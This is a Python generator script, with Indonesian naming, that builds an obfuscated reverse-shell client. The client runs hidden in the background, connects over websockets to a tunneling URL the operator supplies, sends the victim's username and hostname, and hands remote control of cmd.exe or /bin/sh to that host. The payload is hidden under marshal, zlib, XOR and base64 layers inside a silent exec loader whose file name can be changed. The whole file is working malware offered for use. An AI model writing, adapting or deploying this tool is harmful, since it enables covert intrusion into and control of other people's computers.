import base64
import marshal
import zlib

y = input("Do you want custom 'client.py' file name?\n[ y/n ]: ")
if y == "y":
    custom = input("Enter custom file name for 'client.py': ")
else:
    custom = "client.py"

def xor_encrypt_decrypt(data: bytes, key: int) -> bytes:
  """Processing.."""
  return bytes([b ^ key for b in data])

def buat_client_multi_layer(cf_link, xor_key=0x5A):
  if cf_link.startswith("https://"):
    cf_url = cf_link.replace("https://", "wss://", 1)
  elif cf_link.startswith("http://"):
    cf_url = cf_link.replace("http://", "ws://", 1)
  else:
    cf_url = f"wss://{cf_link}"

  cf_url = cf_url.rstrip("/")

  # TEMPLATE PAYLOAD (Background, OS Detection, & Reverse Shell)
  template_kode = f"""
import asyncio
import websockets
import os
import sys
import platform
import getpass

CF_URL = "{cf_url}"

def daemonize():
    if os.name == 'nt':
        import subprocess
        if sys.executable.endswith("pythonw.exe") == False:
            python_w = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(python_w):
                subprocess.Popen([python_w] + sys.argv, creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
    else:
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            pass
        os.setsid()

async def reverse_shell():
    while True:
        try:
            async with websockets.connect(CF_URL) as ws:
                if os.name == 'nt':
                    shell_cmd = "cmd.exe"
                    os_name = "Windows"
                else:
                    shell_cmd = "/bin/sh"
                    os_name = "Linux"

                user = getpass.getuser()
                hostname = platform.node()
                init_msg = f"\\n[+] Target Connected! OS: {{os_name}} | User: {{user}}@{{hostname}}\\n"
                await ws.send(init_msg.encode())

                proc = await asyncio.create_subprocess_shell(
                    shell_cmd,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

                async def read_stdout():
                    while True:
                        data = await proc.stdout.read(1024)
                        if not data: break
                        await ws.send(data)

                async def read_stderr():
                    while True:
                        data = await proc.stderr.read(1024)
                        if not data: break
                        await ws.send(data)

                async def write_stdin():
                    async for message in ws:
                        if isinstance(message, str):
                            proc.stdin.write(message.encode())
                        else:
                            proc.stdin.write(message)
                        await proc.stdin.drain()

                await asyncio.gather(read_stdout(), read_stderr(), write_stdin())

        except Exception:
            await asyncio.sleep(5)

if __name__ == '__main__':
    daemonize()
    try:
        asyncio.run(reverse_shell())
    except KeyboardInterrupt:
        pass
"""

  byte_code = compile(template_kode, "<string>", "exec")
  layer1 = zlib.compress(marshal.dumps(byte_code))
  layer2 = xor_encrypt_decrypt(layer1, xor_key)
  layer3 = base64.b64encode(layer2).decode("utf-8")

  loader_final = f"""import base64, marshal, zlib

def _x(d, k):
    return bytes([b ^ k for b in d])

_enc = "{layer3}"
_key = {xor_key}

try:
    _l3 = base64.b64decode(_enc)
    _l2 = _x(_l3, _key)
    _l1 = zlib.decompress(_l2)
    _bc = marshal.loads(_l1)
    exec(_bc)
except Exception as e:
    pass
"""

  with open(custom, "w", encoding="utf-8") as f:
    f.write(loader_final)

  print(f"\nDone!")
  print(f"--> WSS URL : {cf_url}")

if __name__ == "__main__":
  print("=== Python Shell Generate ===")
  input_link = input("Enter your tunneling url (EXAMPLE: trycloudflare.com): ").strip()
  if input_link:
    buat_client_multi_layer(input_link, xor_key=0x5A)
  else:
    print("Invalid Input")
